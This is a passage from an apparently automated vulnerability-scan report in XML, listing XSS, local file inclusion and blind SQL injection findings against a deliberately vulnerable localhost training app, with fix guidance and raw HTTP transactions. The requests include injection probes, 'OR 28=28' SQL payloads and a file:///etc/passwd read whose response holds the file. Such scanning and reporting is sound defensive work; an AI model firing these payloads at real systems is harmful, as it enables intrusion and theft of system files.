    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_4&quot;, using HTTP method GET. The sent data was: &quot;comment=&quot; The modified parameter was &quot;comment&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="10734">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_4?comment=akegp%3Cakegpakegp--%3Eakegpakegp%2A%2Fakegpakegp%2A%2F%3A%28%22%27akegpakegp%3Aakegpakegp%0Aakegpakegp%22akegpakegp%27akegpakegp%60akegpakegp%20%3Dakegp HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:11:46 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="244" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5ha2VncDxha2VncGFrZWdwLS0+YWtlZ3Bha2VncCovYWtlZ3Bha2VncCovOigiJ2FrZWdwYWtlZ3A6YWtlZ3Bha2VncApha2VncGFrZWdwImFrZWdwYWtlZ3AnYWtlZ3Bha2VncGBha2VncGFrZWdwID1ha2VncDwvZGl2Pg==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[11012]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_5" var="comment">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_5&quot;, using HTTP method GET. The sent data was: &quot;comment=&quot; The modified parameter was &quot;comment&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="11012">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_5?comment=5kgdg%3C5kgdg5kgdg--%3E5kgdg5kgdg%2A%2F5kgdg5kgdg%2A%2F%3A%28%22%275kgdg5kgdg%3A5kgdg5kgdg%0A5kgdg5kgdg%225kgdg5kgdg%275kgdg5kgdg%605kgdg5kgdg%20%3D5kgdg HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:12:50 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="244" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj41a2dkZzw1a2dkZzVrZ2RnLS0+NWtnZGc1a2dkZyovNWtnZGc1a2dkZyovOigiJzVrZ2RnNWtnZGc6NWtnZGc1a2dkZwo1a2dkZzVrZ2RnIjVrZ2RnNWtnZGcnNWtnZGc1a2dkZ2A1a2dkZzVrZ2RnID01a2dkZzwvZGl2Pg==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[11924]" method="GET" name="Local file inclusion vulnerability" plugin="lfi" severity="Medium" url="http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_1" var="fileurl">
    <description>Local File Inclusion was found at: &quot;http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_1&quot;, using HTTP method GET. The sent data was: &quot;fileurl=file%3A%2F%2F%2Fetc%2Fpasswd&quot; The modified parameter was &quot;fileurl&quot;.</description>

    <long-description>Web applications occasionally use parameter values to store the
location of a file which will later be required by the server.

An
example of this is often seen in error pages, where the actual file
path for the error page is stored in a parameter value -- for example
`example.com/error.php?page=404.php`.

A file inclusion occurs when
the parameter value (ie. path to file) can be substituted with the
path of another resource on the same server, effectively allowing the
displaying of arbitrary, and possibly restricted/sensitive, files.
The tool discovered that it was possible to substitute a parameter
value with another resource and have the server return the contents of
the resource to the client within the response.</long-description>
    <fix-guidance>It is recommended that untrusted data is never used to form a file
location to be included.

To validate data, the application should ensure that the supplied 
value for a file is permitted. This can be achieved by performing 
whitelisting on the parameter value, by matching it against a list
of permitted files. If the supplied value does not match any value
in the whitelist, then the server should redirect to a standard
error page.

In some scenarios, where dynamic content is being requested, it may
not be possible to perform validation against a list of trusted resources,
therefore the list must also become dynamic (updated as the files change),
or perform filtering to remove extraneous user input (such as semicolons,
periods etc.) and only permit `a-z0-9`.

It is also advised that sensitive files are not stored within the
web root and that the user permissions enforced by the directory
are correct.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="OWASP" url="https://www.owasp.org/index.php/PHP_File_Inclusion" />
    </references>

    <http-transactions>
            <http-transaction id="11924">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_1?fileurl=file%3A%2F%2F%2Fetc%2Fpasswd HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:16:06 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50Ijoicm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoYmluOng6MToxOmJpbjovYmluOi9zYmluL25vbG9naW5kYWVtb246eDoyOjI6ZGFlbW9uOi9zYmluOi9zYmluL25vbG9naW5hZG06eDozOjQ6YWRtOi92YXIvYWRtOi9zYmluL25vbG9naW5scDp4OjQ6NzpscDovdmFyL3Nwb29sL2xwZDovc2Jpbi9ub2xvZ2luc3luYzp4OjU6MDpzeW5jOi9zYmluOi9iaW4vc3luY3NodXRkb3duOng6NjowOnNodXRkb3duOi9zYmluOi9zYmluL3NodXRkb3duaGFsdDp4Ojc6MDpoYWx0Oi9zYmluOi9zYmluL2hhbHRtYWlsOng6ODoxMjptYWlsOi92YXIvc3Bvb2wvbWFpbDovc2Jpbi9ub2xvZ2lubmV3czp4Ojk6MTM6bmV3czovdXNyL2xpYi9uZXdzOi9zYmluL25vbG9naW51dWNwOng6MTA6MTQ6dXVjcDovdmFyL3Nwb29sL3V1Y3BwdWJsaWM6L3NiaW4vbm9sb2dpbm9wZXJhdG9yOng6MTE6MDpvcGVyYXRvcjovcm9vdDovYmluL3NobWFuOng6MTM6MTU6bWFuOi91c3IvbWFuOi9zYmluL25vbG9naW5wb3N0bWFzdGVyOng6MTQ6MTI6cG9zdG1hc3RlcjovdmFyL3Nwb29sL21haWw6L3NiaW4vbm9sb2dpbmNyb246eDoxNjoxNjpjcm9uOi92YXIvc3Bvb2wvY3Jvbjovc2Jpbi9ub2xvZ2luZnRwOng6MjE6MjE6Oi92YXIvbGliL2Z0cDovc2Jpbi9ub2xvZ2luc3NoZDp4OjIyOjIyOnNzaGQ6L2Rldi9udWxsOi9zYmluL25vbG9naW5hdDp4OjI1OjI1OmF0Oi92YXIvc3Bvb2wvY3Jvbi9hdGpvYnM6L3NiaW4vbm9sb2dpbnNxdWlkOng6MzE6MzE6U3F1aWQ6L3Zhci9jYWNoZS9zcXVpZDovc2Jpbi9ub2xvZ2lueGZzOng6MzM6MzM6WCBGb250IFNlcnZlcjovZXRjL1gxMS9mczovc2Jpbi9ub2xvZ2luZ2FtZXM6eDozNTozNTpnYW1lczovdXNyL2dhbWVzOi9zYmluL25vbG9naW5wb3N0Z3Jlczp4OjcwOjcwOjovdmFyL2xpYi9wb3N0Z3Jlc3FsOi9iaW4vc2hjeXJ1czp4Ojg1OjEyOjovdXNyL2N5cnVzOi9zYmluL25vbG9naW52cG9wbWFpbDp4Ojg5Ojg5OjovdmFyL3Zwb3BtYWlsOi9zYmluL25vbG9naW5udHA6eDoxMjM6MTIzOk5UUDovdmFyL2VtcHR5Oi9zYmluL25vbG9naW5zbW1zcDp4OjIwOToyMDk6c21tc3A6L3Zhci9zcG9vbC9tcXVldWU6L3NiaW4vbm9sb2dpbmd1ZXN0Ong6NDA1OjEwMDpndWVzdDovZGV2L251bGw6L3NiaW4vbm9sb2dpbm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovOi9zYmluL25vbG9naW4iLCJpc1ZhbGlkIjp0cnVlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[13386, 13389]" method="GET" name="Blind SQL injection vulnerability" plugin="blind_sqli" severity="High" url="http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1" var="id">
    <description>Blind SQL injection was found at: &quot;b'http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1'&quot;, using HTTP method b'GET'. The injectable parameter is: &quot;b'id'&quot;. </description>

    <long-description>Due to the requirement for dynamic content of today's web
applications, many rely on a database backend to store data that will
be called upon and processed by the web application (or other
programs). Web applications retrieve data from the database by using
Structured Query Language (SQL) queries.

To meet demands of many
developers, database servers (such as MSSQL, MySQL, Oracle etc.) have
additional built-in functionality that can allow extensive control of
the database and interaction with the host operating system itself.
An SQL injection occurs when a value originating from the client's
request is used within a SQL query without prior sanitisation. This
could allow cyber-criminals to execute arbitrary SQL code and steal
data or use the additional functionality of the database server to
take control of more server components.

The successful exploitation
of a SQL injection can be devastating to an organisation and is one of
the most commonly exploited web application vulnerabilities.



Injection was detected as it was possible to inject specific SQL
queries, that if vulnerable, result in the responses for each
injection being different. This is known as a blind SQL injection
vulnerability.</long-description>
    <fix-guidance>The only proven method to prevent against SQL injection attacks while
still maintaining full application functionality is to use
parameterized queries (also known as prepared statements). When
utilising this method of querying the database, any value supplied by
the client will be handled as a string value rather than part of the
SQL query.

Additionally, when utilising parameterized queries, the
database engine will automatically check to make sure the string being
used matches that of the column. For example, the database engine will
check that the user supplied input is an integer if the database
column is configured to contain integers.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="MITRE - CAPEC" url="http://capec.mitre.org/data/definitions/7.html" />
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
            <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/Blind_SQL_Injection" />
    </references>

    <http-transactions>
            <http-transaction id="13386">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1?id=28%20OR%2028%3D28%20OR%2028%3D28%20 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:19 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJpZCI6MSwibmFtZSI6IkF1ZGkiLCJpbWFnZVBhdGgiOiIvVnVsbmVyYWJsZUFwcC9pbWFnZXMvY2Fycy9BdWRpLmpwZyJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="13389">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_1?id=28%20OR%2028%3D28%20OR%2028%3D28%20 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:19 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJpZCI6MCwibmFtZSI6bnVsbCwiaW1hZ2VQYXRoIjpudWxsfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[13725, 13737]" method="GET" name="Blind SQL injection vulnerability" plugin="blind_sqli" severity="High" url="http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_2" var="id">
    <description>Blind SQL injection was found at: &quot;b'http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_2'&quot;, using HTTP method b'GET'. The injectable parameter is: &quot;b'id'&quot;. </description>

    <long-description>Due to the requirement for dynamic content of today's web
applications, many rely on a database backend to store data that will
be called upon and processed by the web application (or other
programs). Web applications retrieve data from the database by using
Structured Query Language (SQL) queries.

To meet demands of many
developers, database servers (such as MSSQL, MySQL, Oracle etc.) have
additional built-in functionality that can allow extensive control of
the database and interaction with the host operating system itself.
An SQL injection occurs when a value originating from the client's
request is used within a SQL query without prior sanitisation. This
could allow cyber-criminals to execute arbitrary SQL code and steal
data or use the additional functionality of the database server to
take control of more server components.

The successful exploitation
of a SQL injection can be devastating to an organisation and is one of
the most commonly exploited web application vulnerabilities.



Injection was detected as it was possible to inject specific SQL
queries, that if vulnerable, result in the responses for each
injection being different. This is known as a blind SQL injection
vulnerability.</long-description>
    <fix-guidance>The only proven method to prevent against SQL injection attacks while
still maintaining full application functionality is to use
parameterized queries (also known as prepared statements). When
utilising this method of querying the database, any value supplied by
the client will be handled as a string value rather than part of the
SQL query.

Additionally, when utilising parameterized queries, the
database engine will automatically check to make sure the string being
used matches that of the column. For example, the database engine will
check that the user supplied input is an integer if the database
column is configured to contain integers.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="MITRE - CAPEC" url="http://capec.mitre.org/data/definitions/7.html" />
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
            <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/Blind_SQL_Injection" />
    </references>

    <http-transactions>
            <http-transaction id="13725">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_2?id=70%20OR%2070%3D70%20OR%2070%3D70%20 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:28 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJpZCI6MSwibmFtZSI6IkF1ZGkiLCJpbWFnZVBhdGgiOiIvVnVsbmVyYWJsZUFwcC9pbWFnZXMvY2Fycy9BdWRpLmpwZyJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="13737">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_2?id=70%20OR%2070%3D70%20OR%2070%3D70%20 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:28 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJpZCI6MCwibmFtZSI6bnVsbCwiaW1hZ2VQYXRoIjpudWxsfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[15092]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_1" var="src">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_1&quot;, using HTTP method GET. The sent data was: &quot;src=&quot; The modified parameter was &quot;src&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="15092">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_1?src=ma9zx%3Cma9zxma9zx--%3Ema9zxma9zx%2A%2Fma9zxma9zx%2A%2F%3A%28%22%27ma9zxma9zx%3Ama9zxma9zx%0Ama9zxma9zx%22ma9zxma9zx%27ma9zxma9zx%60ma9zxma9zx%20%3Dma9zx HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:58 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="155" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGltZyBzcmM9bWE5eng8bWE5enhtYTl6eC0tPm1hOXp4bWE5engqL21hOXp4bWE5engqLzooIidtYTl6eG1hOXp4Om1hOXp4bWE5engKbWE5enhtYTl6eCJtYTl6eG1hOXp4J21hOXp4bWE5enhgbWE5enhtYTl6eCA9bWE5enggd2lkdGg9IjQwMCIgaGVpZ2h0PSIzMDAiLz4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[15176]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_2" var="src">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;src=&quot; The modified parameter was &quot;src&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="15176">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_2?src=wobzq%3Cwobzqwobzq--%3Ewobzqwobzq%2A%2Fwobzqwobzq%2A%2F%3A%28%22%27wobzqwobzq%3Awobzqwobzq%0Awobzqwobzq%22wobzqwobzq%27wobzqwobzq%60wobzqwobzq%20%3Dwobzq HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:59 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="157" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGltZyBzcmM9IndvYnpxPHdvYnpxd29ienEtLT53b2J6cXdvYnpxKi93b2J6cXdvYnpxKi86KCInd29ienF3b2J6cTp3b2J6cXdvYnpxCndvYnpxd29ienEid29ienF3b2J6cSd3b2J6cXdvYnpxYHdvYnpxd29ienEgPXdvYnpxIiB3aWR0aD0iNDAwIiBoZWlnaHQ9IjMwMCIvPg==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[15442]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_3" var="src">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;src=y2vks%3Ay2vks&quot; The modified parameter was &quot;src&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="15442">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_3?src=y2vks%3Ay2vks HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
